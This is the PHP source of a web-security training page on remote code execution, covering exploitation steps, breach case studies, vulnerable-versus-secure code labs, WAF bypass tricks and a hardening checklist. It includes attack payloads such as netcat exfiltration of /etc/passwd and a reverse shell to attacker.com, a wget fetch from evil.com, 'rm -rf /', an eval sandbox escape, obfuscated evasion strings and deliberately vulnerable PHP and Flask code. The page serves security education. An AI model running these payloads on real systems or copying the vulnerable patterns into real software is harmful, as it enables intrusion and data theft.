<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RCE Mastery Module | DarkHunter Cyber-Noir</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/rce-info.css?v=1.1">

</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <div class="container">
    <!-- Sidebar Navigation -->
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>
    <nav class="sidebar">
      <div class="sidebar-header">
        <div class="logo">DARKHUNTER</div>
        <div class="logo-sub">CYBER-NOIR ACADEMY</div>
      </div>

      <a href="/DarkHunter/Public/Learning.php" class="back-btn">
        <span>←</span> BACK TO MODULES
      </a>

      <div class="nav-section">
        <div class="nav-title">Module Navigation</div>
        <a href="#introduction" class="nav-link active">01. Introduction</a>
        <a href="#explanation" class="nav-link">02. Detailed Explanation</a>
        <a href="#exploitation" class="nav-link">03. Exploitation Steps</a>
        <a href="#impact" class="nav-link">04. Real-World Impact</a>
        <a href="#codelabs" class="nav-link">05. Code Labs</a>
        <a href="#bypass" class="nav-link">06. Bypass Techniques</a>
        <a href="#prevention" class="nav-link">07. Prevention Checklist</a>
      </div>

      <div class="nav-section">
        <div class="nav-title">Quick Stats</div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px; margin-bottom: 0.5rem;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">CVSS Range</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-red); font-size: 1.25rem;">7.2 - 9.8
          </div>
        </div>
        <div style="padding: 1rem; background: var(--bg-tertiary); border-radius: 6px;">
          <div style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.25rem;">Severity</div>
          <div style="font-family: 'Orbitron', sans-serif; color: var(--accent-orange); font-size: 1.25rem;">CRITICAL
          </div>
        </div>
      </div>
    </nav>

    <!-- Main Content -->
    <main class="main-content">
      <!-- Hero Section -->
      <section id="introduction" class="section">
        <div class="section-header">
          <div class="section-number">MODULE 01 // RCE</div>
          <h1>REMOTE CODE EXECUTION</h1>
        </div>

        <div style="display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap;">
          <span class="severity-badge critical">
            <span>⚠</span>
            <span>CRITICAL SEVERITY</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(176, 38, 255, 0.1); border-color: var(--accent-purple); color: var(--accent-purple);">
            <span class="cvss-score">CVSS: 9.8</span>
          </span>
          <span class="severity-badge"
            style="background: rgba(0, 212, 255, 0.1); border-color: var(--accent-cyan); color: var(--accent-cyan);">
            <span>CWE-94: Code Injection</span>
          </span>
        </div>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">
              <div class="card-icon">?</div>
              What is RCE?
            </div>
            <p>Remote Code Execution (RCE) is a class of vulnerabilities that allows an attacker to execute arbitrary
              code on a target system remotely, without physical access or prior authentication. It represents the most
              severe form of code injection, where malicious input is processed as executable commands by the target
              application or operating system.</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-red); color: var(--accent-red);">!</div>
              Why is it Dangerous?
            </div>
            <p>RCE is considered the "holy grail" of vulnerabilities because it provides complete system compromise.
              Attackers can install malware, exfiltrate sensitive data, pivot to internal networks, establish persistent
              backdoors, and effectively own the entire infrastructure. According to NIST data, RCE vulnerabilities
              typically score between 7.2-9.8 on the CVSS scale [^4^][^10^].</p>
          </div>

          <div class="card">
            <div class="card-title">
              <div class="card-icon" style="border-color: var(--accent-orange); color: var(--accent-orange);">⚡</div>
              Attack Vectors
            </div>
            <p>Common entry points include: deserialization of untrusted data, unsafe eval() functions, file inclusion
              vulnerabilities (LFI/RFI), command injection through shell exec functions, template injection, and
              protocol-level exploits in services like SMB, Wi-Fi drivers, or HTTP multipart parsers [^3^][^11^].</p>
          </div>
        </div>

        <div class="warning-box">
          <div class="warning-title">
            <span>⛔</span> LEGAL WARNING
          </div>
          <p style="margin: 0; font-size: 0.9rem;">The techniques described in this module are for educational purposes
            only. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and
            similar international laws. Always practice on authorized lab environments or bug bounty programs with
            explicit permission.</p>
        </div>
      </section>

      <!-- Detailed Explanation -->
      <section id="explanation" class="section">
        <div class="section-number">MODULE 02</div>
        <h2>Detailed Technical Explanation</h2>

        <h3>Protocol & Code Level Mechanics</h3>

        <p>RCE vulnerabilities manifest through multiple attack vectors, each exploiting different layers of the
          application stack:</p>

        <div class="card">
          <div class="card-title">1. Deserialization Attacks</div>
          <p>When applications deserialize user-controlled data without proper validation, attackers can craft malicious
            serialized objects that execute arbitrary code upon reconstruction. This was the primary vector for
            CVE-2023-26360 in Adobe ColdFusion (CVSS 9.8), where threat actors established footholds on federal agency
            servers [^15^].</p>
        </div>

        <div class="card">
          <div class="card-title">2. Command Injection via Unsafe Functions</div>
          <p>PHP functions like <code>eval()</code>, <code>system()</code>, <code>exec()</code>,
            <code>passthru()</code>, and <code>shell_exec()</code> pass user input directly to the system shell. Without
            proper sanitization, metacharacters (;, |, &&, ||, `) allow command chaining.
          </p>
        </div>

        <div class="card">
          <div class="card-title">3. Protocol-Level Exploits</div>
          <p>CVE-2024-30078 demonstrated RCE in Microsoft Wi-Fi drivers, where specially crafted network packets allowed
            unauthenticated attackers to execute code without user interaction [^11^]. Similarly, EternalBlue
            (CVE-2017-0144) exploited SMBv1 protocol flaws to propagate WannaCry ransomware across 300,000 systems
            within 24 hours [^3^][^16^].</p>
        </div>

        <div class="info-box">
          <div class="info-title">The Execution Chain</div>
          <p style="margin: 0;">RCE exploitation typically follows this sequence: <strong>Input Entry → Validation
              Bypass → Code Injection → Arbitrary Execution → Privilege Escalation → Persistence</strong>. Breaking this
            chain at any point prevents compromise.</p>
        </div>

        <div class="flow-diagram">
          <div class="flow-label">[ EXPLOITATION FLOW DIAGRAM PLACEHOLDER ]</div>
          <div style="margin-top: 1rem; font-size: 0.8rem; color: var(--text-muted);">
            Attacker → Malicious Payload → Network Transmission → Vulnerable Parser → Command Execution → System
            Compromise
          </div>
        </div>
      </section>

      <!-- Exploitation Steps -->
      <section id="exploitation" class="section">
        <div class="section-number">MODULE 03</div>
        <h2>Exploitation Methodology</h2>

        <h3>Phase 1: Reconnaissance & Discovery</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Identify Injection Points</div>
            <p>Map all user input vectors: URL parameters, headers, POST bodies, file uploads, cookies, and WebSocket
              messages. Look for parameters reflecting in responses or affecting server behavior.</p>
          </li>
          <li>
            <div class="step-title">Fingerprint Technology Stack</div>
            <p>Use tools like Wappalyzer, Nmap, or manual header analysis to identify server-side language (PHP, Java,
              Python), frameworks, and potential dangerous functions in use.</p>
          </li>
          <li>
            <div class="step-title">Detect WAF Presence</div>
            <p>Send benign malicious-looking payloads (e.g., <code>alert(1)</code>) to trigger WAF responses. Analyze
              HTTP status codes (403, 406, 429) and response bodies for WAF signatures [^1^].</p>
          </li>
        </ol>

        <h3>Phase 2: Payload Crafting & Testing</h3>

        <div class="payload-grid">
          <div class="payload-card">
            <div class="payload-title">PHP eval() Injection</div>
            <div class="payload-code">'; system('id'); //</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Command Chaining</div>
            <div class="payload-code">; cat /etc/passwd | nc attacker.com 9001</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">Backtick Execution</div>
            <div class="payload-code">`wget http://evil.com/shell.php`</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">PHP Filter Chain</div>
            <div class="payload-code">php://filter/read=convert.base64-encode/resource=index.php</div>
          </div>
        </div>

        <h3>Phase 3: Manual Testing with Burp Suite</h3>
        <ol class="steps-list">
          <li>
            <div class="step-title">Configure Interception</div>
            <p>Set up Burp Proxy with browser integration. Enable interception and navigate to target functionality.
              Capture requests containing user input parameters.</p>
          </li>
          <li>
            <div class="step-title">Fuzzing with Intruder</div>
            <p>Send suspicious requests to Intruder. Load payloads from SecLists/Fuzzing wordlists. Use grep matching to
              identify successful execution indicators (output length changes, error messages) [^14^].</p>
          </li>
          <li>
            <div class="step-title">Confirm Execution</div>
            <p>Use out-of-band (OOB) techniques: DNS interaction via Burp Collaborator, or time-delay payloads
              (<code>sleep 10</code>) to confirm code execution even without direct output.</p>
          </li>
        </ol>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Bash</span>
            <span class="code-label vulnerable">Exploitation Script</span>
          </div>
          <pre><code><span class="code-comment"># Automated RCE detection via time-based blind injection</span>
<span class="code-keyword">for</span> payload <span class="code-keyword">in</span> $(cat payloads.txt); <span class="code-keyword">do</span>
    start=$(date +%s)
    curl -s -X POST <span class="code-string">"http://target.com/api/execute"</span> \
         -d <span class="code-string">"command=</span>$payload<span class="code-string">"</span> > /dev/null
    end=$(date +%s)
    diff=$((end-start))
    <span class="code-keyword">if</span> [ $diff -gt 9 ]; <span class="code-keyword">then</span>
        <span class="code-function">echo</span> <span class="code-string">"[+] Vulnerable to: $payload"</span>
    <span class="code-keyword">fi</span>
<span class="code-keyword">done</span></code></pre>
        </div>

        <div style="margin-top: 1.5rem;">
          <span class="tool-tag">Burp Suite</span>
          <span class="tool-tag">OWASP ZAP</span>
          <span class="tool-tag">Commix</span>
          <span class="tool-tag">Metasploit</span>
          <span class="tool-tag">sqlmap (OS shell)</span>
        </div>
      </section>

      <!-- Real-World Impact -->
      <section id="impact" class="section">
        <div class="section-number">MODULE 04</div>
        <h2>Real-World Breach Analysis</h2>

        <p>RCE vulnerabilities have been responsible for some of the most devastating cyber attacks in history.
          Understanding these cases provides crucial context for the severity of this vulnerability class.</p>

        <div class="breach-timeline">
          <div class="breach-item">
            <div class="breach-year">2017</div>
            <div class="breach-title">WannaCry & EternalBlue</div>
            <div class="breach-impact">CVE-2017-0144 (SMBv1 RCE) weaponized by NSA and leaked by Shadow Brokers. Within
              24 hours, 300,000+ systems across 150 countries were infected. UK's National Health Service hospitals were
              devastated, with operations cancelled and medical devices disabled. Attributed to North Korean threat
              actors by Five Eyes Alliance [^3^][^16^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2017</div>
            <div class="breach-title">Equifax Data Breach</div>
            <div class="breach-impact">CVE-2017-5638 in Apache Struts 2 (Jakarta Multipart Parser RCE) allowed attackers
              shell access to Equifax's dispute portal. Over 76 days, PII of 147.9 million consumers was exfiltrated.
              The vulnerability was patched in March but exploitation began in May—highlighting how patching delays
              cause more damage than zero-days [^6^][^16^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2020</div>
            <div class="breach-title">SolarWinds Supply Chain</div>
            <div class="breach-impact">Russian SVR exploited a zero-day RCE in SolarWinds Orion Platform, deploying
              malware across 18,000+ private and government networks. Source code, passwords, financial data, and
              usernames were compromised in one of the most catastrophic breaches of the decade [^3^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2021</div>
            <div class="breach-title">Log4Shell (Log4j)</div>
            <div class="breach-impact">CVE-2021-44228 allowed trivial JNDI lookups to execute code on millions of Java
              applications. One in four organizations were targeted with exploitation attempts. APT groups embedded
              long-term backdoors while mass scanning bots deployed cryptominers. The vulnerability existed in
              ubiquitous logging library used by Apple, Amazon, Twitter, and thousands more [^3^][^6^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2022</div>
            <div class="breach-title">Spring4Shell</div>
            <div class="breach-impact">CVE-2022-22965 in Spring Framework (CVSS Critical) impacted Spring MVC and
              WebFlux applications running JDK 9+. Threat actors deployed cryptominers and botnet malware. The
              vulnerability stemmed from unsafe deserialization of request parameters [^3^].</div>
          </div>

          <div class="breach-item">
            <div class="breach-year">2023</div>
            <div class="breach-title">MOVEit Transfer Mass Compromise</div>
            <div class="breach-impact">A chained SQL-injection-to-deserialization flaw allowed Cl0p ransomware operators
              to exfiltrate data from 2,700+ organizations through a single managed file-transfer platform. Progress
              Software's MOVEit became the vector for one of the largest supply-chain data thefts [^6^].</div>
          </div>
        </div>

        <div class="warning-box" style="margin-top: 2rem;">
          <div class="warning-title">Key Insight from Incident Analysis</div>
          <p style="margin: 0;">According to Arctic Wolf Labs, <strong>patching delays, not zero-days, do most of the
              damage</strong>. In the Equifax breach, the 76-day window between patch availability and exploitation
            detection allowed complete data exfiltration. Organizations must prioritize rapid patching of RCE
            vulnerabilities given their CVSS scores typically range 7.2-9.8 [^6^][^9^].</p>
        </div>
      </section>

      <!-- Code Labs -->
      <section id="codelabs" class="section">
        <div class="section-number">MODULE 05</div>
        <h2>Secure vs Vulnerable Code Labs</h2>

        <h3>Lab 1: Command Injection in PHP</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Vulnerable to Command Injection</span>
$host = $_GET[<span class="code-string">'host'</span>];

<span class="code-comment">// Direct shell execution - DANGEROUS</span>
<span class="code-function">echo</span> <span class="code-string">"Ping results:"</span>;
<span class="code-danger">system("ping -c 4 " . $host);</span>

<span class="code-comment">// Attacker can inject: ; cat /etc/passwd</span>
<span class="code-comment">// Or: | nc attacker.com 9999 -e /bin/bash</span>
<span class="code-comment">// Or: `rm -rf /`</span>
<span class="code-keyword">?></span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Secure implementation</span>
$host = $_GET[<span class="code-string">'host'</span>] ?? <span class="code-string">''</span>;

<span class="code-comment">// Whitelist validation</span>
<span class="code-keyword">if</span> (!filter_var($host, FILTER_VALIDATE_IP) && 
    !filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
    <span class="code-keyword">die</span>(<span class="code-string">"Invalid host format"</span>);
}

<span class="code-comment">// Escape shell arguments</span>
$safe_host = escapeshellarg($host);
$command = <span class="code-string">"ping -c 4 "</span> . $safe_host;

<span class="code-comment">// Use exec with output array instead of system</span>
<span class="code-function">exec</span>($command, $output, $return_code);
<span class="code-keyword">if</span> ($return_code === 0) {
    <span class="code-function">echo</span> <span class="code-function">implode</span>(<span class="code-string">"\\n"</span>, $output);
}
<span class="code-keyword">?></span></code></pre>
          </div>
        </div>

        <h3>Lab 2: Unsafe Deserialization</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Vulnerable to PHP Object Injection</span>
$data = $_COOKIE[<span class="code-string">'user_data'</span>];

<span class="code-comment">// Direct unserialization of user input</span>
<span class="code-danger">$object = unserialize($data);</span>

<span class="code-comment">// If attacker controls $data, they can</span>
<span class="code-comment">// inject arbitrary PHP objects leading to RCE</span>
<span class="code-comment">// via POP chains (Property Oriented Programming)</span>
<span class="code-keyword">?></span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Secure alternative using JSON</span>
$data = $_COOKIE[<span class="code-string">'user_data'</span>] ?? <span class="code-string">''</span>;

<span class="code-comment">// Use JSON instead of native serialization</span>
$decoded = json_decode($data, <span class="code-keyword">true</span>);
<span class="code-keyword">if</span> (json_last_error() !== JSON_ERROR_NONE) {
    <span class="code-keyword">die</span>(<span class="code-string">"Invalid data format"</span>);
}

<span class="code-comment">// Or if serialization is required, use HMAC</span>
$expected_hmac = hash_hmac(<span class="code-string">'sha256'</span>, $data, $secret_key);
<span class="code-keyword">if</span> (!hash_equals($expected_hmac, $_COOKIE[<span class="code-string">'signature'</span>])) {
    <span class="code-keyword">die</span>(<span class="code-string">"Data integrity check failed"</span>);
}
<span class="code-keyword">?></span></code></pre>
          </div>
        </div>

        <h3>Lab 3: File Inclusion Vulnerabilities</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Vulnerable to LFI/RFI</span>
$page = $_GET[<span class="code-string">'page'</span>];

<span class="code-comment">// Direct file inclusion</span>
<span class="code-danger">include($page . ".php");</span>

<span class="code-comment">// Bypass: ?page=../../../../etc/passwd%00</span>
<span class="code-comment">// RFI: ?page=http://evil.com/shell</span>
<span class="code-comment">// Log Poisoning: ?page=../../../../var/log/apache2/access.log</span>
<span class="code-keyword">?></span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">PHP</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-keyword"><?php</span>
<span class="code-comment">// Secure file inclusion with whitelist</span>
$page = $_GET[<span class="code-string">'page'</span>] ?? <span class="code-string">'home'</span>;

<span class="code-comment">// Define allowed pages</span>
$allowed_pages = [<span class="code-string">'home'</span>, <span class="code-string">'about'</span>, <span class="code-string">'contact'</span>];

<span class="code-keyword">if</span> (!in_array($page, $allowed_pages, <span class="code-keyword">true</span>)) {
    <span class="code-keyword">die</span>(<span class="code-string">"Invalid page requested"</span>);
}

<span class="code-comment">// Use basename to prevent path traversal</span>
$safe_page = basename($page);
<span class="code-function">include</span>(<span class="code-string">'pages/'</span> . $safe_page . <span class="code-string">'.php'</span>);
<span class="code-keyword">?></span></code></pre>
          </div>
        </div>

        <h3>Lab 4: Python eval() Injection</h3>

        <div class="code-comparison">
          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python</span>
              <span class="code-label vulnerable">Vulnerable</span>
            </div>
            <pre><code><span class="code-comment"># Vulnerable Flask endpoint</span>
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request

app = Flask(__name__)

<span class="code-keyword">@app.route</span>(<span class="code-string">'/calculate'</span>)
<span class="code-keyword">def</span> <span class="code-function">calculate</span>():
    expression = request.args.get(<span class="code-string">'expr'</span>)
    <span class="code-comment"># DANGEROUS: Direct eval of user input</span>
    <span class="code-danger">result = eval(expression)</span>
    <span class="code-keyword">return</span> {<span class="code-string">'result'</span>: result}

<span class="code-comment"># Payload: __import__('os').system('id')</span>
<span class="code-comment"># Or: [].__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('sh')</span></code></pre>
          </div>

          <div class="code-block">
            <div class="code-header">
              <span class="code-lang">Python</span>
              <span class="code-label secure">Secure</span>
            </div>
            <pre><code><span class="code-comment"># Secure implementation using ast.literal_eval</span>
<span class="code-keyword">import</span> ast
<span class="code-keyword">import</span> operator

<span class="code-keyword">@app.route</span>(<span class="code-string">'/calculate'</span>)
<span class="code-keyword">def</span> <span class="code-function">calculate_safe</span>():
    expression = request.args.get(<span class="code-string">'expr'</span>, <span class="code-string">''</span>)
    
    <span class="code-comment"># Whitelist of allowed operators</span>
    allowed_ops = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv
    }
    
    <span class="code-keyword">try</span>:
        tree = ast.parse(expression, mode=<span class="code-string">'eval'</span>)
        <span class="code-keyword">if</span> <span class="code-keyword">not</span> all(isinstance(node, (ast.Expression, ast.BinOp, 
                              ast.Num, ast.operator)) 
                   <span class="code-keyword">for</span> node <span class="code-keyword">in</span> ast.walk(tree)):
            <span class="code-keyword">return</span> {<span class="code-string">'error'</span>: <span class="code-string">'Invalid expression'</span>}, 400
        result = eval(compile(tree, <span class="code-string">''</span>, <span class="code-string">'eval'</span>), {<span class="code-string">"__builtins__"</span>: {}}, {})
        <span class="code-keyword">return</span> {<span class="code-string">'result'</span>: result}
    <span class="code-keyword">except</span>:
        <span class="code-keyword">return</span> {<span class="code-string">'error'</span>: <span class="code-string">'Invalid expression'</span>}, 400</code></pre>
          </div>
        </div>
      </section>

      <!-- Bypass Techniques -->
      <section id="bypass" class="section">
        <div class="section-number">MODULE 06</div>
        <h2>WAF & Filter Bypass Techniques</h2>

        <p>Modern Web Application Firewalls (WAFs) employ signature-based detection, rate limiting, and behavioral
          analysis to block RCE attempts. Attackers have developed sophisticated evasion techniques to circumvent these
          controls [^1^][^2^][^14^].</p>

        <div class="card-grid">
          <div class="card">
            <div class="card-title">1. Encoding Obfuscation</div>
            <p>Transform payloads using URL encoding, Base64, hex encoding, or Unicode normalization to bypass signature
              matching.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">%3B%20%63%61%74%20%2F%65%74%63%2F%70%61%73%73%77%64
            </div>
          </div>

          <div class="card">
            <div class="card-title">2. Case Randomization</div>
            <p>Mix uppercase and lowercase characters to evade case-sensitive filters while maintaining command
              functionality.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">SyStEm('iD') vs system('id')</div>
          </div>

          <div class="card">
            <div class="card-title">3. Command Substitution</div>
            <p>Use alternative syntax for command execution: backticks, $(), ${}, or indirect references.</p>
            <div class="payload-code" style="margin-top: 0.5rem;">$(cat /etc/passwd) or `whoami`</div>
          </div>

          <div class="card">
            <div class="card-title">4. Whitelist String Abuse</div>
            <p>Some WAFs contain shared secrets or tokens that bypass filtering when included in requests [^14^].</p>
            <div class="payload-code" style="margin-top: 0.5rem;">?data=malicious&admin_bypass=true</div>
          </div>
        </div>

        <h3>Advanced Evasion Strategies</h3>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">Payloads</span>
            <span class="code-label vulnerable">WAF Evasion</span>
          </div>
          <pre><code><span class="code-comment"># Technique 1: Comment injection to break signatures</span>
cat /etc/passwd → cat /et<span class="code-comment">/**/</span>c/pas<span class="code-comment">/**/</span>swd

<span class="code-comment"># Technique 2: String concatenation</span>
cat /etc/passwd → c'a't /et'c/pa'ss'wd
cat /etc/passwd → cat /etc/p??s??

<span class="code-comment"># Technique 3: Environment variable expansion</span>
/bin/bash → ${PATH:0:1}bin${PATH:0:1}bash

<span class="code-comment"># Technique 4: Wildcard abuse</span>
cat /etc/passwd → /???/???t /???/??????

<span class="code-comment"># Technique 5: Reversed commands via rev</span>
echo 'dwpssap/cte/' | rev | xargs cat

<span class="code-comment"># Technique 6: Hex-encoded strings in PHP</span>
eval(hex2bin("73797374656d2827696427293b")); <span class="code-comment"># system('id');</span></code></pre>
        </div>

        <div class="info-box">
          <div class="info-title">Rate Limiting Bypass</div>
          <p style="margin: 0;">When encountering HTTP 429 (Too Many Requests), sophisticated attackers implement
            adaptive strategies: pausing for strategic intervals (up to 1 hour), rotating proxy chains, manipulating
            payloads to be less detectable (e.g., using <code>whoami</code> instead of <code>/etc/passwd</code>), and
            comparing baseline vs. malicious request responses to identify WAF triggers [^1^].</p>
        </div>

        <h3>Request Header Spoofing</h3>
        <p>Adding spoofed headers can trick WAFs into believing requests originate from internal networks, causing them
          to bypass inspection [^14^]:</p>

        <div class="payload-grid">
          <div class="payload-card">
            <div class="payload-title">X-Originating-IP</div>
            <div class="payload-code">127.0.0.1</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">X-Forwarded-For</div>
            <div class="payload-code">10.0.0.1, 127.0.0.1</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">X-Remote-IP</div>
            <div class="payload-code">192.168.1.1</div>
          </div>
          <div class="payload-card">
            <div class="payload-title">X-Client-IP</div>
            <div class="payload-code">172.16.0.1</div>
          </div>
        </div>
      </section>

      <!-- Prevention Checklist -->
      <section id="prevention" class="section">
        <div class="section-number">MODULE 07</div>
        <h2>Prevention & Remediation Checklist</h2>

        <div class="card" style="border-color: var(--accent-green);">
          <div class="card-title" style="color: var(--accent-green);">
            <div class="card-icon" style="border-color: var(--accent-green);">✓</div>
            Developer Security Checklist
          </div>

          <ul class="checklist">
            <li><strong>Never use eval(), exec(), system(), or similar functions</strong> with user-controlled input. If
              absolutely necessary, implement strict whitelist validation.</li>

            <li><strong>Implement input validation</strong> using whitelist approaches (accept known-good) rather than
              blacklist approaches (reject known-bad). Attackers constantly invent new bypass techniques.</li>

            <li><strong>Use parameterized APIs</strong> and avoid shell execution entirely. Prefer native language
              functions over OS command invocation.</li>

            <li><strong>Implement proper serialization controls</strong>. Never deserialize untrusted data. Use JSON for
              data interchange instead of native serialization formats (PHP serialize, Java ObjectInputStream, Python
              pickle).</li>

            <li><strong>Apply the principle of least privilege</strong>. Web applications should run with minimal
              permissions, using dedicated service accounts without shell access.</li>

            <li><strong>Implement Web Application Firewalls (WAF)</strong> with tuned rules for RCE patterns, but never
              rely solely on WAFs for security—defense in depth is essential [^1^].</li>

            <li><strong>Enable security headers</strong>: Content-Security-Policy, X-Frame-Options,
              X-Content-Type-Options to reduce attack surface.</li>

            <li><strong>Conduct regular security testing</strong> including SAST (Static Application Security Testing),
              DAST (Dynamic Application Security Testing), and manual penetration testing.</li>

            <li><strong>Maintain aggressive patch management</strong>. Given that RCE vulnerabilities average CVSS 9.8
              for critical issues [^10^], patches should be applied within 24-48 hours of release.</li>

            <li><strong>Implement runtime application self-protection (RASP)</strong> to detect and block exploitation
              attempts in real-time.</li>

            <li><strong>Use parameterized queries</strong> and ORMs to prevent SQL injection that could chain into RCE
              via database functions (xp_cmdshell, etc.).</li>

            <li><strong>Disable dangerous PHP functions</strong> in php.ini: disable_functions =
              exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</li>

            <li><strong>Implement file upload restrictions</strong>: validate MIME types, extension whitelists, size
              limits, and store uploads outside web root.</li>

            <li><strong>Use containerization and sandboxing</strong> to isolate applications and limit the blast radius
              of successful RCE exploitation.</li>
          </ul>
        </div>

        <div class="code-block">
          <div class="code-header">
            <span class="code-lang">PHP Configuration</span>
            <span class="code-label secure">Hardening</span>
          </div>
          <pre><code><span class="code-comment">; php.ini security hardening for RCE prevention</span>
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,eval,assert
allow_url_fopen = Off
allow_url_include = Off
auto_prepend_file = <span class="code-string">"security_bootstrap.php"</span>

<span class="code-comment">; Enable strict error reporting (disable in production display)</span>
error_reporting = E_ALL
log_errors = On
display_errors = Off</code></pre>
        </div>

        <div class="warning-box">
          <div class="warning-title">Final Warning</div>
          <p style="margin: 0;">RCE vulnerabilities are consistently rated Critical (CVSS 9.0+) by security
            organizations including Microsoft, Atlassian, and NIST [^4^][^5^][^10^]. The 2024 Edgescan report shows that
            33% of discovered vulnerabilities across full stack deployments were Critical or High severity, with RCE
            representing a significant portion [^9^]. Organizations must treat RCE patching as a P0 (Priority Zero)
            operational requirement.</p>
        </div>

        <div
          style="text-align: center; margin-top: 3rem; padding: 2rem; background: var(--bg-secondary); border-radius: 8px;">
          <div
            style="font-family: 'Orbitron', sans-serif; font-size: 1.25rem; color: var(--accent-green); margin-bottom: 1rem;">
            MODULE COMPLETED
          </div>
          <p style="color: var(--text-muted); margin: 0;">
            You have completed the Remote Code Execution mastery module.<br>
            Proceed to practical labs or return to the module selection screen.
          </p>
        </div>
      </section>
    </main>
  </div>

  <script>
  // Smooth scrolling for navigation links
  document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const targetId = this.getAttribute('href');
      const targetSection = document.querySelector(targetId);
      if (targetSection) {
        targetSection.scrollIntoView({
          behavior: 'smooth'
        });

        // Update active state
        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
        this.classList.add('active');
      }
    });
  });

  // Update active nav on scroll
  const sections = document.querySelectorAll('.section');
  const navLinks = document.querySelectorAll('.nav-link');

  window.addEventListener('scroll', () => {
    let current = '';
    sections.forEach(section => {
      const sectionTop = section.offsetTop;
      const sectionHeight = section.clientHeight;
      if (scrollY >= (sectionTop - 200)) {
        current = section.getAttribute('id');
      }
    });

    navLinks.forEach(link => {
      link.classList.remove('active');
      if (link.getAttribute('href') === '#' + current) {
        link.classList.add('active');
      }
    });
  });
  </script>
  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>